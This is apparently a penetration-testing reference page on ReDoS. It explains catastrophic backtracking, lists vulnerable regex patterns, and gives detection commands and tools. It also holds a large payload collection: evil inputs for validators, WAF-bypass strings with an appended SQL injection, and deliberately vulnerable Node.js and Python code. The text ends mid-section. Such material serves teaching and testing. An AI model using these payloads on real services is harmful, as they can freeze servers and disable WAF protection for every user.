---
title: ReDoS — Regular Expression Denial of Service
description: ReDoS attacks — vulnerable regex patterns, catastrophic backtracking, payload crafting, detection techniques, exploitation in web applications, APIs, WAF bypass, real-world patterns, privilege escalation through denial of service, and defense strategies for penetration testers and security researchers.
navigation:
  icon: i-lucide-regex
  title: ReDoS
---

## What is ReDoS?

ReDoS (Regular Expression Denial of Service) is a **algorithmic complexity attack** that exploits the way regular expression engines process certain patterns. When a regex engine uses **backtracking** (NFA-based engines), carefully crafted input strings can cause the engine to enter an **exponential or polynomial time** processing state, consuming extreme CPU resources and effectively freezing the application thread — sometimes for **minutes, hours, or indefinitely** from a single request.

::callout{icon="i-lucide-info" color="blue"}
ReDoS is not about sending massive amounts of traffic. A **single HTTP request** with a carefully crafted string of just 30-50 characters can consume 100% CPU on a server thread for minutes. This makes ReDoS one of the most efficient denial-of-service attack vectors — requiring minimal bandwidth but causing maximum impact.
::

### How Regular Expression Engines Work

::tabs
  :::tabs-item{icon="i-lucide-eye" label="NFA vs DFA Engines"}

  | Engine Type | Behavior | Vulnerable to ReDoS? | Used By |
  |------------|----------|---------------------|---------|
  | **NFA (Nondeterministic Finite Automaton)** | Uses **backtracking** — tries multiple paths | **Yes** ✅ | Python, Java, JavaScript, .NET, Ruby, PHP, Perl, Go (`regexp2`), Rust (`regex` crate fancy mode) |
  | **DFA (Deterministic Finite Automaton)** | Processes each character **once** — no backtracking | **No** ❌ | Go (`regexp`), Rust (`regex` default), RE2, Intel Hyperscan |
  | **Hybrid** | DFA first, falls back to NFA for complex features | **Sometimes** | PCRE2 (with JIT), .NET (with timeout) |

  Most programming languages and web frameworks use **NFA-based engines**, making ReDoS a widespread vulnerability class.
  :::

  :::tabs-item{icon="i-lucide-code" label="What is Backtracking?"}

  When an NFA engine encounters a regex like `a+b` against the string `aaac`:

  ```text
  Step 1: a+ matches "aaa" (greedy — takes all 'a's)
  Step 2: Try 'b' against 'c' → FAIL
  Step 3: BACKTRACK — a+ gives back one 'a', now matches "aa"
  Step 4: Try 'b' against 'a' → FAIL  
  Step 5: BACKTRACK — a+ gives back another 'a', now matches "a"
  Step 6: Try 'b' against 'a' → FAIL
  Step 7: BACKTRACK — a+ gives back last 'a', now matches ""
  Step 8: Try 'a+' from position 1... repeat
  Step 9: No match found after exhausting all paths
  ```

  For simple patterns, backtracking is fast. But for **vulnerable patterns**, the number of paths to explore grows **exponentially** with input length.
  :::

  :::tabs-item{icon="i-lucide-code" label="Catastrophic Backtracking"}

  Consider the regex `(a+)+$` against the string `aaaaaaaaaaaaaaaaX`:

  ```text
  The engine must decide how to distribute 'a' characters across
  the inner a+ and the outer ()+:
  
  Attempt 1: (aaaaaaaaaaaaaaaa) — outer group once, all a's inside → X fails $
  Attempt 2: (aaaaaaaaaaaaaaa)(a) — outer group twice → X fails $
  Attempt 3: (aaaaaaaaaaaaaa)(aa) — try different split → X fails $
  Attempt 4: (aaaaaaaaaaaaaa)(a)(a) — three groups → X fails $
  ... and so on for EVERY possible combination
  
  For N characters, the engine tries 2^N combinations.
  
  16 a's: 65,536 combinations
  20 a's: 1,048,576 combinations  
  25 a's: 33,554,432 combinations
  30 a's: 1,073,741,824 combinations
  40 a's: ~1 TRILLION combinations
  ```

  This **exponential blowup** from a single short string is catastrophic backtracking.
  :::
::

---

## Vulnerable Regex Patterns

Understanding which regex patterns are vulnerable is the foundation of ReDoS exploitation.

### The Three Conditions for ReDoS

A regex is vulnerable to ReDoS when **all three** conditions are present:

::card-group
  ::card
  ---
  title: "1. Quantified Repetition"
  icon: i-lucide-repeat
  ---
  The pattern contains a **quantifier** applied to a group or character class: `+`, `*`, `{n,m}`, or `{n,}`. These allow the engine to match variable-length sequences.
  ::

  ::card
  ---
  title: "2. Overlapping Alternatives"
  icon: i-lucide-layers
  ---
  The repeated group contains elements that can **match the same characters** through different paths. Examples: `(a|a)`, `(a+)+`, `(\w|\d)`, `[a-zA-Z0-9_]+\w+`. The ambiguity forces the engine to try multiple matching strategies.
  ::

  ::card
  ---
  title: "3. Failing Suffix"
  icon: i-lucide-x-circle
  ---
  The input string **almost matches** but ultimately **fails** at the end. The failure forces the engine to backtrack through all possible combinations of the ambiguous repetition before concluding no match exists.
  ::
::

### Vulnerable Pattern Categories

::collapsible
---
label: "Nested Quantifiers — (a+)+ Pattern"
---

The most classic and dangerous ReDoS pattern. A quantifier inside a quantifier creates exponential paths.

| Vulnerable Pattern | Description | Evil Input |
|-------------------|-------------|------------|
| `(a+)+` | Nested plus | `aaaaaaaaaaaaaaaaX` |
| `(a+)*` | Nested star | `aaaaaaaaaaaaaaaaX` |
| `(a*)+` | Star inside plus | `aaaaaaaaaaaaaaaaX` |
| `(a*)*` | Double star | `aaaaaaaaaaaaaaaaX` |
| `(a+)+$` | Nested plus with anchor | `aaaaaaaaaaaaaaaaX` |
| `(a+){2,}` | Nested with range | `aaaaaaaaaaaaaaaaX` |
| `(aa+)+` | Two-char nested | `aaaaaaaaaaaaaaaaX` |
| `(a+)(a+)+` | Adjacent nested groups | `aaaaaaaaaaaaaaaaX` |
| `((a+)b)+` | Nested with literal | `aababababababababX` |
| `(a{1,10})+` | Range inside plus | `aaaaaaaaaaaaaaaaX` |

```python [Demonstration — Python]
import re
import time

pattern = re.compile(r'(a+)+$')

for length in [15, 20, 25, 28, 30]:
    evil_input = 'a' * length + 'X'
    start = time.time()
    pattern.match(evil_input)
    elapsed = time.time() - start
    print(f"Length {length}: {elapsed:.4f} seconds")

# Output:
# Length 15: 0.0312 seconds
# Length 20: 1.0156 seconds
# Length 25: 32.5000 seconds
# Length 28: 262.0000 seconds (4+ minutes)
# Length 30: 1048.0000 seconds (17+ minutes!)
```
::

::collapsible
---
label: "Alternation with Overlap — (a|a)+ Pattern"
---

When alternatives in an alternation can match the same character, the engine must try both paths.

| Vulnerable Pattern | Description | Evil Input |
|-------------------|-------------|------------|
| `(a\|a)+$` | Direct overlap | `aaaaaaaaaaaaaaaaX` |
| `(a\|ab)+$` | Prefix overlap | `aaaaaaaaaaaaaaaaX` |
| `(a\|aa)+$` | Length overlap | `aaaaaaaaaaaaaaaaX` |
| `(\w\|\d)+$` | Class overlap (digits match both) | `1111111111111111X` |
| `([a-z]\|[a-m])+$` | Range overlap | `aaaaaaaaaaaaaaaaX` |
| `(.\|a)+$` | Dot overlaps with literal | `aaaaaaaaaaaaaaaaX` |
| `(\s\| )+$` | Space class overlap | `                X` |
| `(\w\|_)+$` | Underscore overlap | `________________X` |
| `(x\|xy)+$` | Prefix string overlap | `xxxxxxxxxxxxxxxxX` (non-y) |
| `(ab\|abc)+$` | String prefix overlap | `abababababababab!` |
::

::collapsible
---
label: "Quantified Overlapping Adjacency — a+a+ Pattern"
---

When two adjacent quantified elements can match the same characters, the engine must decide how to split the input between them.

| Vulnerable Pattern | Description | Evil Input |
|-------------------|-------------|------------|
| `a+a+$` | Adjacent same-char quantifiers | `aaaaaaaaaaaaaaaaX` |
| `\d+\d+$` | Adjacent digit quantifiers | `1111111111111111X` |
| `\w+\w+$` | Adjacent word quantifiers | `aaaaaaaaaaaaaaaaX` |
| `.+.+$` | Adjacent dot quantifiers | `aaaaaaaaaaaaaaaaX` |
| `\s+\s+$` | Adjacent space quantifiers | `                X` |
| `[a-z]+[a-z]+$` | Adjacent class quantifiers | `aaaaaaaaaaaaaaaaX` |
| `a+[ab]+$` | Quantifier + overlapping class | `aaaaaaaaaaaaaaaaX` |
| `\d+[0-9]+$` | Digit + equivalent class | `1111111111111111X` |
| `\w+\d+$` | Word + digit (digits are word chars) | `1111111111111111X` |
| `.+\w+$` | Dot + word (word chars match dot) | `aaaaaaaaaaaaaaaaX` |
::

::collapsible
---
label: "Complex Real-World Vulnerable Patterns"
---

These patterns are commonly found in production applications for input validation.

| Pattern | Purpose | Evil Input |
|---------|---------|------------|
| `^(([a-z])+.)+[A-Z]([a-z])+$` | Name validation | `aaaaaaaaaaaaaaa!` |
| `([a-zA-Z0-9._-]+)*@` | Email prefix | `aaaaaaaaaaaaaaa!` |
| `([\w.-]+)+@` | Email validation | `aaaaaaaaaaaaaaa!` |
| `(\w+\.)*\w+@` | Email with subdomains | `a.a.a.a.a.a.a.a!` |
| `^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$` | URL validation | `http://aaa.aaa.aaaaaaaaaaaa!` |
| `^([a-zA-Z0-9])(([\-.]?\|[_])?([a-zA-Z0-9]))*$` | Username validation | `aaaaaaaaaaaaaaa!` |
| `(\d{1,3}\.){3}\d{1,3}` | IPv4 (without anchoring) | `1.1.1.1.1.1.1.1.!` |
| `^(0?\|[1-9][0-9]*)(\.[0-9]+)?$` | Number validation | `0.0.0.0.0.0.0.0.!` |
| `^((25[0-5]\|2[0-4][0-9]\|[01]?[0-9][0-9]?)\.){3}` | IPv4 strict | `1111111111111111!` |
| `([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}` | IPv6 validation | `1:1:1:1:1:1:1:1:!` |
| `<([a-z]+)([^<]+)*(?:>(.*)<\/\1>\|\s+\/>)` | HTML tag parsing | `<a aaaaaaaaaaaa!` |
| `(\d+\.?\d*\|\.\d+)([eE][-+]?\d+)?` | Float validation | `1.1.1.1.1.1.1.1!` |
| `^[\w\s]+$` combined with `.+` | Multi-pattern validation | Very long string of word chars + non-word |
| `(.*a){20}` | Repeated greedy match | `aaaaaaaaaaaaaaaaaaa!` |
| `([^\s]+\s?)*$` | Whitespace normalization | `word word word word !` |
| `((ab)*)+$` | Repeated group of group | `ababababababababX` |
| `(\w+\s?)*$` | Word-space repetition | `word word word word!` |
| `([a-zA-Z]+\d?)+$` | Alphanumeric sequences | `aaaa1aaaa1aaaa1X` |
::

### Polynomial vs Exponential ReDoS

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Exponential — O(2^n)"}

  Exponential ReDoS occurs with **nested quantifiers** or **overlapping alternation**. Processing time **doubles** with each additional character.

  ```text
  Pattern: (a+)+$
  Input length 20: ~1 second
  Input length 25: ~32 seconds
  Input length 30: ~1024 seconds
  Input length 40: ~12 days
  ```

  These are the most dangerous — a short input causes devastating impact.
  :::

  :::tabs-item{icon="i-lucide-eye" label="Polynomial — O(n^k)"}

  Polynomial ReDoS occurs with **adjacent overlapping quantifiers** without nesting. Processing time grows as a **power** of input length.

  ```text
  Pattern: \d+\d+\d+$
  This is O(n^3) — cubic complexity

  Input length 100: ~0.001 seconds
  Input length 1000: ~1 second
  Input length 10000: ~1000 seconds
  Input length 100000: ~1000000 seconds
  ```

  Polynomial ReDoS requires **longer input** but can still be devastating at sufficient length.
  :::

  :::tabs-item{icon="i-lucide-code" label="Complexity Comparison"}

  | Pattern Type | Complexity | Input Length for 1s Hang | Input Length for 1min Hang |
  |-------------|-----------|------------------------|--------------------------|
  | `(a+)+$` | O(2^n) | ~20 chars | ~26 chars |
  | `(a\|a)+$` | O(2^n) | ~20 chars | ~26 chars |
  | `a+a+$` | O(n²) | ~50,000 chars | ~400,000 chars |
  | `a+a+a+$` | O(n³) | ~5,000 chars | ~20,000 chars |
  | `(a+){10}$` | O(n^10) | ~100 chars | ~200 chars |
  | `.+.+.+.+$` | O(n⁴) | ~2,000 chars | ~6,000 chars |

  :::
::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: Source Code Review
  icon: i-lucide-code
  ---
  Search application source code for regex patterns with nested quantifiers, overlapping alternation, or adjacent quantified groups. Grep for `re.compile`, `Pattern.compile`, `new RegExp`, `/pattern/`, `preg_match`, and similar.
  ::

  ::card
  ---
  title: JavaScript Client-Side Analysis
  icon: i-lucide-monitor
  ---
  Review client-side JavaScript for regex used in input validation, search, filtering, and formatting. Browser DevTools and source maps reveal regex patterns.
  ::

  ::card
  ---
  title: Black-Box Timing Analysis
  icon: i-lucide-clock
  ---
  Submit progressively longer ReDoS payloads and measure response times. An exponential increase in response time with linear input length increase confirms ReDoS.
  ::

  ::card
  ---
  title: WAF / Middleware Rules
  icon: i-lucide-shield
  ---
  WAF rules, ModSecurity rules, and input validation middleware often contain vulnerable regex patterns. Review WAF configurations for ReDoS-prone rules.
  ::

  ::card
  ---
  title: Open Source Dependency Audit
  icon: i-lucide-package
  ---
  Check third-party libraries and packages for known ReDoS vulnerabilities. Many npm packages, Python libraries, and Java libraries have had ReDoS CVEs.
  ::

  ::card
  ---
  title: API Documentation Analysis
  icon: i-lucide-file-text
  ---
  API documentation sometimes exposes regex patterns used for input validation. OpenAPI/Swagger specs may include `pattern` fields that reveal vulnerable regex.
  ::
::

### Static Analysis — Finding Vulnerable Regex in Code

::code-group
```bash [Grep — Python]
# Find regex patterns in Python code
grep -rn "re\.compile\|re\.match\|re\.search\|re\.findall\|re\.sub\|re\.fullmatch" --include="*.py" .
```

```bash [Grep — JavaScript]
# Find regex in JavaScript
grep -rn "new RegExp\|\.match(\|\.test(\|\.replace(\|\.search(\|\.split(" --include="*.js" .

# Find regex literals
grep -rn "/[^/]*/[gims]*" --include="*.js" .
```

```bash [Grep — Java]
# Find regex in Java
grep -rn "Pattern\.compile\|\.matches(\|\.replaceAll(\|\.split(" --include="*.java" .
```

```bash [Grep — PHP]
# Find regex in PHP
grep -rn "preg_match\|preg_replace\|preg_split\|preg_match_all" --include="*.php" .
```

```bash [Grep — Ruby]
# Find regex in Ruby
grep -rn "Regexp\.new\|=~\|\.match\|\.scan\|\.gsub\|\.sub" --include="*.rb" .
```

```bash [Grep — .NET/C#]
# Find regex in C#
grep -rn "new Regex\|Regex\.Match\|Regex\.IsMatch\|Regex\.Replace" --include="*.cs" .
```

```bash [Grep — Vulnerable Patterns Specifically]
# Search for nested quantifiers
grep -rPn "\([^)]*[+*][^)]*\)[+*]" --include="*.py" --include="*.js" --include="*.java" .

# Search for overlapping adjacency
grep -rPn "\\\\[wds][+*]\\\\[wds][+*]" --include="*.py" --include="*.js" .
```
::

### Automated ReDoS Detection Tools

::collapsible
---
label: "Static Analysis Tools for ReDoS Detection"
---

```bash [recheck — Universal Regex Analyzer]
# Install
npm install -g recheck

# Analyze a single regex
recheck "(a+)+$"

# Output:
# Status: vulnerable
# Complexity: exponential
# Attack string: 'aaaaaaaaaaaaaaaa!'
# Hotspot: (a+)+
```

```bash [regexploit — Python/JavaScript]
# Install
pip install regexploit

# Scan Python file
regexploit scan app.py

# Scan JavaScript file
regexploit scan validation.js
```

```bash [safe-regex — JavaScript]
# Install
npm install safe-regex

# Usage in code
const safe = require('safe-regex');
console.log(safe('(a+)+'));     // false (vulnerable)
console.log(safe('[a-z]+'));    // true (safe)
```

```bash [rxxr2 — Academic ReDoS Analyzer]
# Highly accurate static analyzer
# Detects exponential and polynomial ReDoS
echo "(a+)+$" | rxxr2
```

```python [Python — Manual Vulnerability Test]
import re
import time

def test_redos(pattern_str, base_char='a', suffix='!', max_length=30):
    """Test a regex pattern for ReDoS vulnerability."""
    pattern = re.compile(pattern_str)
    
    print(f"Pattern: {pattern_str}")
    print(f"{'Length':<10} {'Time (s)':<15} {'Status'}")
    print("-" * 45)
    
    prev_time = 0
    for length in range(5, max_length + 1, 5):
        evil_input = base_char * length + suffix
        
        start = time.time()
        try:
            pattern.search(evil_input)
        except Exception:
            pass
        elapsed = time.time() - start
        
        ratio = elapsed / prev_time if prev_time > 0.001 else 0
        status = "⚠️ SLOW" if elapsed > 1 else "✅ OK"
        if elapsed > 5:
            status = "🔴 VULNERABLE"
        
        print(f"{length:<10} {elapsed:<15.6f} {status} (ratio: {ratio:.1f}x)")
        prev_time = elapsed
        
        if elapsed > 10:
            print(f"\n[!] ReDoS CONFIRMED — stopped at length {length}")
            break

# Test common vulnerable patterns
test_redos(r'(a+)+$')
test_redos(r'([a-zA-Z]+)*$')
test_redos(r'\d+\.\d+\.\d+\.\d+$')
```
::

---

## Payloads

::note
ReDoS payloads are crafted based on the **specific regex pattern** being targeted. Each payload must match the pattern's character classes while triggering the failure condition that causes catastrophic backtracking. The payloads below are organized by the **type of vulnerable pattern** and the **context** where they appear.
::

### Universal ReDoS Payloads

These payloads target the most commonly found vulnerable patterns across web applications.

::collapsible
---
label: "Nested Quantifier Payloads — (a+)+"
---

```text [Basic — Short]
aaaaaaaaaaaaaaaaaaaaa!
```

```text [Medium Length — 25 chars]
aaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Long — 30 chars (minutes of processing)]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Very Long — 35 chars (hours)]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [With Different Base Character]
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb!
```

```text [With Digits — (\d+)+]
1111111111111111111111111111111!
```

```text [With Word Characters — (\w+)+]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [With Spaces — (\s+)+]
                              !
```

```text [With Mixed — ([a-z0-9]+)+]
aaaa1111aaaa1111aaaa1111aaaa11!
```

```text [With Dots — ([^/]+)+]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/
```

```text [With Special End Char]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n
```

```text [Null Byte Suffix]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%00
```
::

::collapsible
---
label: "Overlapping Alternation Payloads — (a|a)+"
---

```text [Direct Overlap — (a|a)+$]
aaaaaaaaaaaaaaaaaaaaa!
```

```text [Prefix Overlap — (a|ab)+$]
aaaaaaaaaaaaaaaaaaaaa!
```

```text [Class Overlap — (\w|\d)+$]
1111111111111111111111111111111!
```

```text [Range Overlap — ([a-z]|[a-m])+$]
aaaaaaaaaaaaaaaaaaaaa!
```

```text [Dot Overlap — (.|a)+$]
aaaaaaaaaaaaaaaaaaaaa\n
```

```text [String Overlap — (abc|abd)+$]
abcabcabcabcabcabcabc!
```

```text [Multi-Char Overlap — (ab|abc)+$]
abababababababababababababababab!
```
::

::collapsible
---
label: "Adjacent Quantifier Payloads — a+a+"
---

```text [Basic Adjacent — a+a+$]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Triple Adjacent — a+a+a+$]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Quad Adjacent — a+a+a+a+$]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Digit Adjacent — \d+\d+$]
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!
```

```text [Word Adjacent — \w+\w+$]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Dot Adjacent — .+.+$]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n
```

Note: Adjacent quantifier payloads require **longer strings** because the complexity is polynomial (O(n²)) rather than exponential.
::

### Context-Specific Payloads

Payloads crafted for regex patterns commonly used in specific validation contexts.

::collapsible
---
label: "Email Validation ReDoS"
---

Common vulnerable email regex patterns:

```text
Pattern: ^([a-zA-Z0-9._-]+)*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
Pattern: ^([\w.-]+)+@
Pattern: ^([a-zA-Z0-9]+([._-][a-zA-Z0-9]+)*)+@
```

```text [Email ReDoS — Dot Repeat]
aaaaaaaaaaaaaaaaaaaaaaaaaaa!@example.com
```

```text [Email ReDoS — Long Local Part]
a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]
```

```text [Email ReDoS — Special Char Suffix]
aaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Email ReDoS — Nested Dots]
a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```

```text [Email ReDoS — Underscore Pattern]
a_a_a_a_a_a_a_a_a_a_a_a_a_a_a!
```

```text [Email ReDoS — Hyphen Pattern]
a-a-a-a-a-a-a-a-a-a-a-a-a-a-a!
```

```text [Email ReDoS — Mixed Separators]
a.a-a_a.a-a_a.a-a_a.a-a_a.a-a!
```

```text [Email ReDoS — Long with Valid End]
aaaaaaaaaaaaaaaaaaaaaaaaaaa!@x.com
```

```text [Email ReDoS — Partial Valid]
aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa@
```
::

::collapsible
---
label: "URL Validation ReDoS"
---

Common vulnerable URL regex patterns:

```text
Pattern: ^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$
Pattern: ^(https?://)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/.*)?$
Pattern: (([\w]+:)?\/\/)?(([\d\w]|%[a-fA-f\d]{2,2})+(:([\d\w]|%[a-fA-f\d]{2,2})+)?@)?([\d\w][-\d\w]{0,253}[\d\w]\.)+[\w]{2,63}
```

```text [URL ReDoS — Path Repeat]
http://aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa!
```

```text [URL ReDoS — Subdomain Repeat]
http://a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```

```text [URL ReDoS — Path Segment Repeat]
http://x.com/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a!
```

```text [URL ReDoS — Long Path]
http://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [URL ReDoS — Protocol Fuzzing]
httpx://aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa.aaa
```

```text [URL ReDoS — Dotted Path]
http://x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x.x!
```

```text [URL ReDoS — Query String Heavy]
http://x.com?a=a&a=a&a=a&a=a&a=a&a=a&a=a&a=a&a=a&a=a!
```
::

::collapsible
---
label: "IP Address Validation ReDoS"
---

```text
Pattern: ^(\d{1,3}\.){3}\d{1,3}$
Pattern: ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$
```

```text [IPv4 ReDoS — Digit Repeat]
1111111111111111111111111111111!
```

```text [IPv4 ReDoS — Dotted Repeat]
1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1!
```

```text [IPv4 ReDoS — Mixed]
111.111.111.111.111.111.111.111.111!
```

```text [IPv4 ReDoS — Almost Valid]
255.255.255.255.255.255.255.255.255!
```

```text [IPv4 ReDoS — Long Digits]
99999999999999999999999999999999!
```
::

::collapsible
---
label: "HTML/XML Parsing ReDoS"
---

```text
Pattern: <([a-z]+)([^<]+)*(?:>(.*)<\/\1>|\s+\/>)
Pattern: <\s*(\w+)[^>]*>.*?<\s*\/\1\s*>
Pattern: <!--(.*?)-->
```

```text [HTML Tag ReDoS — Attribute Repeat]
<a aaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [HTML Tag ReDoS — Long Attribute Value]
<div class="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [HTML Tag ReDoS — Nested-Like]
<a <a <a <a <a <a <a <a <a <a !
```

```text [HTML Comment ReDoS]
<!-- aaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [HTML Tag ReDoS — Multiple Attributes]
<div a="a" a="a" a="a" a="a" a="a" a="a" a="a" !
```

```text [XML CDATA ReDoS]
<![CDATA[aaaaaaaaaaaaaaaaaaaaaaaaaaa!
```
::

::collapsible
---
label: "Password/Username Validation ReDoS"
---

```text
Pattern: ^([a-zA-Z0-9]+([._-][a-zA-Z0-9]+)*)+$
Pattern: ^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$
Pattern: ^[\w.-]+$
```

```text [Username ReDoS — Dot Separated]
a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```

```text [Username ReDoS — Underscore Separated]
a_a_a_a_a_a_a_a_a_a_a_a_a_a_a_a_a_a!
```

```text [Username ReDoS — Hyphen Separated]
a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a!
```

```text [Username ReDoS — Mixed Separators]
a.a-a_a.a-a_a.a-a_a.a-a_a.a-a_a.a-a!
```

```text [Password ReDoS — Long Valid-Like]
Aa1!Aa1!Aa1!Aa1!Aa1!Aa1!Aa1!Aa1!X
```

```text [Password ReDoS — Almost Matching]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA
```
::

::collapsible
---
label: "File Path / Directory ReDoS"
---

```text
Pattern: ^(\/[a-zA-Z0-9._-]+)+\/?$
Pattern: ^([a-zA-Z]:)?(\\[^\\]+)*\\?$
```

```text [Unix Path ReDoS]
/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a!
```

```text [Windows Path ReDoS]
C:\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a!
```

```text [Path ReDoS — Long Segments]
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Path ReDoS — Mixed]
/a.a/a-a/a_a/a.a/a-a/a_a/a.a/a-a/a_a!
```
::

::collapsible
---
label: "Date/Time Validation ReDoS"
---

```text
Pattern: ^\d{4}[-/]\d{2}[-/]\d{2}$
Pattern: ^(\d{1,2}[/-]){2}\d{2,4}$
```

```text [Date ReDoS — Separator Repeat]
1/1/1/1/1/1/1/1/1/1/1/1/1/1/1!
```

```text [Date ReDoS — Digit Repeat]
11111111111111111111111111111111!
```

```text [Date ReDoS — Mixed Separators]
1-1/1-1/1-1/1-1/1-1/1-1/1-1/1!
```

```text [Time ReDoS]
11:11:11:11:11:11:11:11:11:11:11!
```
::

### WAF Rule ReDoS

WAFs (ModSecurity, Cloudflare, AWS WAF) use regex to detect attack patterns. ReDoS against WAF rules can **bypass** the WAF entirely by causing it to time out.

::caution
Attacking WAF regex rules with ReDoS can cause the WAF to **fail open** (allow traffic through without inspection) or **crash**, effectively disabling the WAF protection for all users.
::

::collapsible
---
label: "WAF Rule ReDoS Payloads"
---

```text [ModSecurity SQL Injection Rule]
# ModSecurity rule regex for SQLi detection:
# (?i:(?:[\s()]case\s*\()|(?:\)\s*like\s*\()|(?:having\s*[^\s]+\s*[^\w\s])|...)
# Evil input to trigger backtracking in the SQLi rule:

' CASE CASE CASE CASE CASE CASE CASE CASE CASE CASE CASE CASE CASE !
```

```text [ModSecurity XSS Rule]
# XSS detection regex often uses:
# (?:<[^>]*[\s/]on\w+=)|(?:javascript:)|...
# Evil input:

<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [WAF Path Traversal Rule]
# Pattern: (\.\.\/){1,}
# Evil input:

../../../../../../../../../../../../../../../../../../../../../../../!
```

```text [WAF Command Injection Rule]
# Pattern matching shell metacharacters
# Evil input with overlapping patterns:

;|;|;|;|;|;|;|;|;|;|;|;|;|;|;|;|;|;|;|;!
```

```text [Generic WAF Bypass — Long Input]
# Many WAF rules have vulnerable patterns for detecting attacks
# Sending very long input that partially matches rules:

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script
```

```text [WAF Timeout → Fail Open]
# If the WAF times out processing regex:
# - Request passes through uninspected
# - Actual attack payload at the END of the input goes through

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' OR '1'='1
# ReDoS payload + actual SQLi at the end
```
::

### Language-Specific ReDoS Payloads

::collapsible
---
label: "JavaScript / Node.js Specific"
---

```javascript [JavaScript — Input Validation ReDoS]
// Vulnerable patterns commonly found in npm packages:
// email-validator, validator.js, ua-parser-js, etc.

// Attack via URL parameter:
// GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

// Attack via User-Agent header:
// User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

// Attack via form field:
// POST /register
// email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!@x.com
```

```javascript [Node.js — Server Freeze]
// If Node.js uses regex in main event loop (single-threaded):
// One ReDoS request freezes ALL requests for ALL users

const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const query = req.query.q;
    // VULNERABLE — regex in main thread
    if (/^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/.test(query)) {
        res.send('Valid');
    } else {
        res.send('Invalid');
    }
});

// Evil request:
// GET /search?q=a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
// Entire server hangs — no other requests can be processed
```

```text [Node.js Event Loop Freeze Payload]
a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```
::

::collapsible
---
label: "Python Specific"
---

```python [Python — ReDoS in Flask/Django]
# Vulnerable URL routing pattern in Django:
# urlpatterns = [
#     re_path(r'^articles/(?P<path>.+)/$', views.article),
# ]
# Pattern (.+)/$ with complex paths can cause backtracking

# Evil input:
# GET /articles/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a!
```

```python [Python re module — Vulnerable]
import re

# Vulnerable pattern in production code
pattern = re.compile(r'^([a-zA-Z0-9._-]+)*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

# Evil input
evil = 'a' * 25 + '!'
pattern.match(evil)  # Hangs for minutes
```

```text [Python-Specific Payloads]
# For (.+)+$ pattern:
